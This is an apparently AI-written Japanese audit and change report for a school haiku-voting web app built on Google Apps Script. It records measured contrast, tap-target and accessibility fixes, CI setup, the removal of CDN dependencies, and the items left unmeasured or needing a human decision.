| 広場（結果発表） | 「投票締切」 | `text-red-500` | 14px 太字 | **3.76** | 4.5 | `text-red-600`（→ 4.83） |
| 先生 | 「👁️ 隠す」 | `text-red-600` on `bg-red-100` | 14px 太字 | **3.95** | 4.5 | `text-red-700`（→ 5.33） |
| 広場（結果発表） | **「けっかはっぴょう」（ふりがな）** | `#d9534f` を継承 | 16.5px 太字 | **3.81** | 4.5 | 下記 F4 参照 |
| 広場（結果発表） | 「🥇 金賞 (6点)」 | `text-yellow-600` | 24px 太字 | **2.94** | 3 | `text-yellow-700`（→ 4.92） |

**「投票受付中／投票締切」は、いま句会がどの段階かを示す唯一の表示**である。
銀賞（`text-slate-500` 4.76）と銅賞（`text-amber-800`）は基準を満たしており、
**金賞だけが落ちている。**

### D9 タップ 44px 未満（8種・11件）

| 画面 | 要素 | 実測 |
|---|---|---|
| 広場 | 並び替えの `<select>` | 104×**36** |
| 広場 | 再読み込み ↻ | **38×38** |
| 作品モーダル | 閉じる × | **36×36** |
| 作品モーダル | コメント入力欄 | 376×**42** |
| 作品モーダル | 「送信」 | 64×**42** |
| 先生 | 「↻ 最新の情報に更新」 | 163×**38** |
| 先生 | 「👁️ 隠す」 | 82×**36** |
| 先生 | 「非表示中 (戻す)」 | 134×**36** |

フッターの「GIGA山」リンクは `tap-44` が効いており **基準を満たしている**
（v4 で入れた疑似要素の当たり判定が、いまも働いていることを実測で確認）。

## E. PWA

**このリポジトリは C型（GAS ウェブアプリ）で、PWA 化されていない。**
§3-5 のとおり GAS は画面を iframe で包むため、**このままでは PWA にできない。**
GitHub Pages 側にシェルを置く C+型への変更が要る。

| # | 項目 | 判定 |
|---|---|:--:|
| E1〜E13 | manifest / sw.js / offline.html / アイコン / 更新通知 ほか | ❌ **すべて未対応**（構成変更が必要。人間の判断事項） |

## F. アクセシビリティ・性能

| # | 項目 | 判定 | 実測 |
|---|---|:--:|---|
| F1 | `alt` / `aria-label` / `aria-live` / `role="alert"` | ✅ | **直した。** アイコンのみのボタンに `aria-label`（実測 未設定 2 → 0）、SVG 9個すべてに `aria-hidden`、トーストに `aria-live`、失敗は `role="alert"` |
| F2 | モーダルに `role="dialog"`・Esc で閉じる | ✅ | **直した。** `role="dialog"` / `aria-modal` / `aria-labelledby` を付け、Esc で閉じ、Tab が外へ出ず、閉じると開く前の要素に focus が戻ることを実測で確認 |
| F3 | **キーボードのみで全機能に到達** | ✅ | **直した。** 短冊を `<button>` にした。実測：フォーカスできる短冊 **0/5 → 5/5**、Tab で到達 → Enter で開く → Esc で閉じて元の短冊に戻る、まで通した |
| F4 | 🆕 `rt` の色を決め打ちしていない | ✅ | **直した。** 継がせる規則からアプリ全体の地の色（`.app-shell`）を除いた。実測で既定色 `#5b6472` が効くようになった。下記参照 |
| F5 | 初回JS 300KB以下 | ✅ | `vendor.html` 157KB + `app.html` 52KB = **209KB**（gzip前） |
| F6 | 1ファイル 5,000行 / 400KB 以内 | ✅ | 最大は `vendor.html` 157KB / `src/app.jsx` 728行 |
| F7 | ルビに `<rp>` を添える | ✅ | 追加（実測 0 → 14 個）|

### F4 の中身：`rt` の色が、一度も効いていない

`tools/extra.css` はこう書いてある。

```css
rt { color: #5b6472; }                    /* 白地での既定値 */
button rt, [class*="bg-"] rt,
[class*="text-white"] rt { color: inherit; }   /* 色のついた面では継がせる */
```

意図は正しい。しかし**アプリの一番外側の `<div>` が `bg-[#fdfaf6]` を持っている**ため、
`[class*="bg-"] rt` が**画面上のすべての `rt` に当たる。**
結果、既定値の `#5b6472` は一度も適用されていない。実測した実効色：

| ふりがな | 実効色 | 継承元 |
|---|---|---|
| くかい | `rgb(60, 74, 109)` | ヘッダー見出し |
| ひろば | `rgb(255, 255, 255)` | 選択中のナビ（濃い面）|
| とうこう / じぶん / かこ / せんせい | `rgb(100, 116, 139)` | 非選択のナビ |
| さくひんひろば | `rgb(30, 41, 59)` | 本文色 |
| **けっかはっぴょう** | **`rgb(217, 83, 79)`** | **見出しの `#d9534f`（比 3.81 ❌）** |

大半は結果的に問題ないが、**薄い色の見出しに付いたふりがなだけが基準を割る。**
§4 が「1か所ずつ潰さない」と書いているのは正しいが、
**逆に広く継がせすぎても、継承元が薄いところで落ちる。**

## G. 学習ログ

| # | 項目 | 判定 |
|---|---|:--:|
| G1・G2 | `study.v1` 準拠 | — | 学習系アプリではないため該当なし |

## H. 納品物・CI

| 項目 | 判定 | 実測 |
|---|:--:|---|
| `.github/workflows/ci.yml` | ✅ | **追加した。`pull_request` と `push` の両方で動く。** 生成物と原本のずれ（`npm run build` の忘れ）を検出して止める |
| `scripts/check-project.mjs` / `quality.config.json` | ✅ | 追加。12項目。**`--self-test` で12項目すべて「わざと壊すと落ちる」ことを確認済み** |
| `tests/` | ✅ | `gas-admin-auth.test.mjs`（管理者APIの認可） |
| `appsscript.json` | ⚠️ | 追加（V8 / Asia/Tokyo）。`oauthScopes` は §5 に従い意図的に書いていない |

> 正本（`Digital_textbook` の `scripts/lib/project-quality.mjs`）は作業環境から
> 取得できなかったため、品質ゲートは自前で書いた。規則は `RULES` 配列に閉じてあり、
> 正本が使えるようになったら差し替えられる。

---

## 未計測（測っていないので ✅ とは書かない）

- **本番（`script.google.com`）での動作**。作業環境から到達できない。
  投稿・投票・紙吹雪・`include()` の3本が通るかは、テストデプロイでの確認が要る
- **CSP を入れたときの挙動**。GAS の `HtmlService` は独自のサンドボックスで包むため、
  `<meta>` の CSP がどう働くかは本番でしか判断できない
- **OAuth スコープの実際の要求内容**。`appsscript.json` が無いため GAS の自動推定に依存しており、
  デプロイしないと何が要求されるか分からない
- **iOS Safari / Chromebook 実機での表示**。手元は Chromium のみ
- **40人同時アクセス時の応答**。`LockService` の待ち時間は再現していない
- **LCP / CLS**。GAS の配信経路を通していないため、意味のある数字が出ない

---

## 対応の結果（前 → 後）

すべて実ブラウザでの実測。判定器は同じ回で自己検証を通している。

| 項目 | 前 | 後 |
|---|---:|---:|
| コントラスト基準未満（9画面を歩いて） | **9件** | **0件** |
| コントラスト基準未満（トースト・別途） | **2件**（2.58 / 3.96） | **0件**（4.84 / 5.33） |
| タップ 44px 未満 | **11件** | **0件** |
| フォーカスできる短冊 | **0 / 5** | **5 / 5** |
| Esc でモーダルが閉じる | いいえ | **はい** |
| アイコンのみのボタンで `aria-label` 無し | 2 | **0** |
| SVG で `aria-hidden` 無し | 9 | **0** |
| ルビの `<rp>` | 0 | **14** |
| 認可の無い管理者API | **4** | **0**（合鍵なしの5通りをすべて弾く） |
| 投票中に端末へ送られる作者名 | **全員分** | **なし** |
| `clamp()` | 0 | 主役3種 |
| 提示モード / 印刷CSS | 無し | あり |
| CI / 品質ゲート / テスト | 無し | あり（ゲート12項目・自己検証つき） |
| `npm ci` | **失敗する** | **通る**（出荷済みバンドルをバイト単位で再現） |
| 320px / 375px の横スクロール | 0件 | 0件（変化なし） |
| JS エラー | 0件 | 0件（変化なし） |
| 初回JS | 209KB | 217KB（上限 300KB） |

### 一瞬しか出ないものは、意識して出さないと測れない

9画面を歩く計測では、**トーストが1件も引っかからなかった。** 数秒で消えるためである。
管理画面の計測でたまたま失敗トーストが写り込んで気づき、そこから成功トーストを
明示的に出して測ったところ、そちらのほうが悪かった。

| トースト | 色 | 比 | 直したあと |
|---|---|---:|---:|
| 成功「俳句を投稿しました！」 | 白 on `#8BAA7A` | **2.58** | `#5C7A4B` → 4.84 |
| 失敗「パスワードが違います」 | 白 on `#d9534f` | **3.96** | `#c9302c` → 5.33 |

**2.58 は「ほとんど読めない」の域である。** 投稿できたのか、なぜ失敗したのかを
伝える唯一の手段がこれだった。空状態・エラー文と同じく、
**画面を出し分けて測らないと存在しない扱いになる。**

---

## 残っているもの（人間の判断が要る）

| 項目 | 状況 |
|---|---|
| **本番での動作確認** | **取れていない。** GAS 本体（`code.gs`）を変えているので、テストデプロイで確かめてから取り込むこと |
| CSP | 未対応。GAS の `HtmlService` が独自のサンドボックスで包むため、本番で確かめないと判断できない |
| PWA 化 | 未対応。C+型（GitHub Pages 側のシェル）への構成変更が要る |
| OAuth スコープの明示 | `appsscript.json` に書いていない（§5 の判断） |
| CSV などの書き出し | 未実装 |
| 自動更新（リアルタイム） | 未実装。ボタンで読み直す |
| 自分の句への投票防止 | 画面側のみ。名前が自己申告なのでサーバー側では判定できない |
| 二重投票の完全な防止 | 端末単位のまま。端末を替えると回避できる |

---

## 対応フェーズの割り当て（当初の案・すべて実施済み）

| フェーズ | 中身 | 破壊リスク |
|---|---|---|
| **P0** | `package-lock.json` を追加（`npm ci` が通るようにし、版を固定） | 低（ただし生成物の作り直しを伴う） |
| **P1-a** | コントラスト5種・タップ8種を直す（`src/app.jsx` + `npm run build`） | 低 |
| **P1-b** | a11y：`aria-label` / `aria-hidden` / `aria-live` / `role="dialog"` / Esc で閉じる / **短冊をキーボードで開けるように** / `<rp>` | 中（画面の作りに触る） |
| **P1-c** | `rt` の継がせ方を絞る（`bg-` の総当たりをやめる） | 低 |
| **P2** | `clamp()` の導入、提示モード、印刷CSS | 中（要否は人間の判断） |
| **P3** | `appsscript.json` の追加、CI（`pull_request` で動くもの）、品質ゲート | 低 |
| **要判断** | **B5 の認可欠如**（GAS 本体。§絶対安全規則10 により自動マージしない） | **高** |
| **要判断** | PWA 化（C+型への構成変更） | 高 |

---
---

# 付録：v4 での改修記録（2026-08-03）

> ここから下は、CDN 依存を外したとき（PR #1）の記録である。
> 当時の実測値をそのまま残している。

## 測り方

本番（`script.google.com`）へは作業環境から到達できないため、
**GAS が返す画面と同じものを手元で組み立てて**測った
（`index.html` の `include()` を実体に置き換え、`google.script.run` をダミーにする）。

計測環境：Chromium 141（Playwright）、1280×900 / DPR 2。
道具は Digital_textbook の
[`scripts/measure/`](https://github.com/GIGAyama/Digital_textbook/tree/main/scripts/measure)。

**この作業環境は `cdn.tailwindcss.com` / `unpkg.com` / `cdn.jsdelivr.net` へ出られない。**
つまり**学校のフィルタリングとまったく同じ状態**で測っている。これは都合がよかった。

---

## 1. いちばん重い：フィルタリングされると画面が一切出なかった

改修前の `index.html` はこう始まっていた。

```html
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
<script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/..."></script>
```

**この5本のうち1本でも届かないと、画面は白いまま何も起きない。**
実測でそうなった。

```json
"問題": ["JS: ReferenceError: tailwind is not defined"],
"読み込み失敗": [
  "https://cdn.tailwindcss.com/ :: net::ERR_TUNNEL_CONNECTION_FAILED",
  "https://unpkg.com/react@18/... :: net::ERR_TUNNEL_CONNECTION_FAILED",
  "https://unpkg.com/@babel/standalone/babel.min.js :: ...",
  ...
]
```

児童からは「壊れている」としか見えない。しかも原因はアプリの外にあるので、
先生が調べても分からない。

### さらに、開くたびに JSX をコンパイルしていた

`@babel/standalone` は **3MB 近くある**うえ、その役目は
**ブラウザの中で JSX を JavaScript に翻訳すること**。
つまり児童が開くたび、728行の JSX を毎回コンパイルし直していた。
40人が同時に開く校内 Wi-Fi では、この時間がそのまま待ち時間になる。

### どう直したか

**全部「先に作っておく」ことにした。**

| もの | 前 | 後 |
|---|---|---|
| Tailwind | ブラウザ内で CSS を生成 | 使っているクラスだけの CSS を先に作る（`css.html`） |
| JSX | ブラウザ内で毎回コンパイル | **ビルド時に1回だけ**コンパイル（`app.html`） |
| React / ReactDOM | unpkg | GAS 側に置く（`vendor.html`） |
| canvas-confetti | jsDelivr | 同上 |

転送量は **約3.3MB → 237KB**。CDN への依存はゼロになった。

```
vendor.html  156.5 KB
css.html      28.1 KB
app.html      52.3 KB
```

直したあとの実測（**CDN が塞がれたまま**）：

```json
"問題": [],
"読み込み失敗": ["fonts.googleapis.com のみ（フォントは無くても崩れない）"]
```

**画面は最後まで出て、6画面すべて操作できた。**

> **`src/app.jsx` が編集する場所。** `app.html` / `css.html` / `vendor.html` は
> `npm run build` が作る生成物なので、手で編集しない。

---

## 2. 拡大を禁止していた

```js
// code.gs（改修前）
.addMetaTag('viewport', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no')
```

**見えづらい子が画面を大きくできない。** 外した。

> 手元で組み立てて測ったとき、`addMetaTag` はサーバー側の処理なので再現されず、
> **一度「viewport の指定が無い」と読み違えた。**
> GAS の画面を測るときは、`index.html` だけでなく `code.gs` の `doGet` も必ず読むこと。

`viewport-fit=cover` は `index.html` と `code.gs` の**両方**に入れた。
GAS は画面を iframe で包むため、片方だけでは安全領域が使えるようにならない。

---

## 3. コントラストとタップ領域

6画面（ようこそ・投稿・広場・自分・過去・先生）を歩いて測った。

| 対象 | 色 | 比 | 直し方 |
|---|---|---:|---|
| ふりがな（送信ボタン上） | 白 on `#d9534f` | **3.96** | ボタンを `#c9302c` に（hover の色にそろえた） |
| 「うへのく／なかのく／したのく」 | `text-slate-300` | **1.48** | `text-slate-500` |
| 「完成プレビュー」 | `text-slate-400` | 2.46 | `text-slate-600` |
| 「現在0文字 (目安:5)」 | `text-slate-400` | 2.56 | 同上 |
| フッター（8か所） | `text-slate-400` | 2.56 | 同上 |
| フッターのリンク | — | 49×16 | 当たり判定だけ 44px に |

**「うへのく／なかのく／したのく」は、俳句のどこを書く欄かを示す案内**で、
比 1.48 はほぼ見えない。**このアプリでいちばん必要な案内が、いちばん見えなかった。**

ふりがなの色は `#64748b` を `#5b6472` にし、色のついた面では継がせるようにした。

**結果：9件 → 0件、タップ 1件 → 0件。**

> **v5 監査での補足。** このとき「0件」としたのは、当時の判定器で測った範囲での話である。
> 今回、判定器の半透明・グラデーションの扱いを直したうえで
> **投票締切（結果発表）を含む9画面**を測り直したところ、
> 上表とは別の5種が残っていた（D8 参照）。
> **結果発表の画面は、当時まだ測っていなかった。**

---

## 4. そのほか入れたもの

- `env(safe-area-inset-*)`（左右下）
- `100dvh`（`@supports` で古い端末に `100vh` を残す）
- `prefers-reduced-motion`（`0.01ms` を残す。`0` にすると `fade-in` が
  `opacity:0` のまま消える）
- `forced-colors`
- `touch-action: manipulation`
- Google Fonts が塞がれても崩れないよう、端末側の明朝体を後ろに並べた
- LICENSE / dependabot / `.gitignore`

---

## 5. 未計測・未対応（v4 時点）

- **PWA 化していない**（manifest / Service Worker / offline.html なし）。
  C型は `script.google.com` 配信のため、GitHub Pages 側のシェル（C+型）を
  作らないと PWA にできない。構成の変更なので別途判断が要る。
- サーバーの戻り値に依存する画面（実際の投稿一覧、投票結果）は未計測。
  ダミーは見本しか返さないため、件数の多い一覧は再現していない。
  → **v5 監査で、戻り値の見本を与えて測った（D8 / D9）。**
- CSP は入れていない。GAS は `HtmlService` が独自のサンドボックスで包むため、
  `<meta>` の CSP がどう働くかを本番で確かめないと判断できない。
- 本番の URL・デプロイ状態は未確認（到達できないため）。

---

## 6. この PR をマージしてよいか（当時の判断・PR #1）

**構成を変えています。** `index.html` は `include()` で
`vendor.html` / `css.html` / `app.html` を読む形になりました。
`code.gs` に `include()` を足しています。

表示まわりは手元で実測していますが、**本番での動作確認は取れていません。**
そのため**自動ではマージしていません。**
テスト用のデプロイで一度動かしてから取り込んでください。

とくに確かめてほしいところ：

1. 画面が最後まで出るか（`include()` が3つとも通っているか）
2. 投稿・投票が今までどおりできるか
3. 紙吹雪が出るか（`canvas-confetti` を GAS 側に移したため）

---

## 7. 作り直す手順

```bash
npm install
npm run build   # app.html / css.html / vendor.html を作り直す
```

**`src/app.jsx` を直したら、必ず `npm run build` を走らせてから push すること。**
生成物を更新し忘れると、変更が画面に出ない。

> `package-lock.json` が無いため `npm ci` は使えない。
> また `npm install` は `^` の範囲で新しい版を取るので、生成物のサイズが
> ここに載せた実測値と変わることがある。作り直したら `git diff` で確かめること。
